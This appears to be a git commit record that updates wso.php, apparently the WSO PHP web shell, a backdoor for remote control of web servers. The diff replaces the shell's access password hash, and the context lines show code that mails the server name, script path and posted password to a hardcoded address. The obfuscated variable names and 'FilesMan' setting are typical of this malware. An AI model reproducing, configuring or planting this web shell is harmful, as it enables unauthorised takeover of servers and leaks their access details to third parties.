85f0c14aaadf520da2f9f2fca268fe675c598f13
seolibertybet <166887921+seolibertybet@users.noreply.github.com>
2024-04-28 14:22:40 +0700

    Update wso.php

--- wso.php
+++ wso.php
@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
+$▛ = "38f4c85759085c68367a4a25603ffc4b";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
